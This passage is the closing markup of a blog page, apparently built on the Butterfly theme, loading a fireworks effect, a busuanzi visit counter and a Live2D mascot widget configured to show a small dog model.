src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
